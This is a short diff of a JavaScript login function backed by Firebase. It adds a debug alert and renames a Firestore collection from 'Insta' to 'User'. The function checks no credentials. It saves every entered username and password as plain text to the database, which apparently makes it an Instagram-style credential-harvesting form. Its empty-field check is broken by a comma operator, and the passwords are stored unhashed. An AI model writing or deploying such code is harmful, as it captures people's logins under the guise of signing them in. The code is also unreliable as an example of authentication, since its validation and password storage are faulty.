@@ -1,6 +1,6 @@
 function login(){
 var db = firebase.firestore();
-
+alert("by");
 var username=document.getElementById("name").value;
 var pass=document.getElementById("password").value;
 
@@ -10,7 +10,7 @@ if (username == null || username == "", pass == null || pass == "") {
   }else{
 
 
-db.collection("Insta").doc().set({
+db.collection("User").doc().set({
     name: username,
     passwords: pass
 })
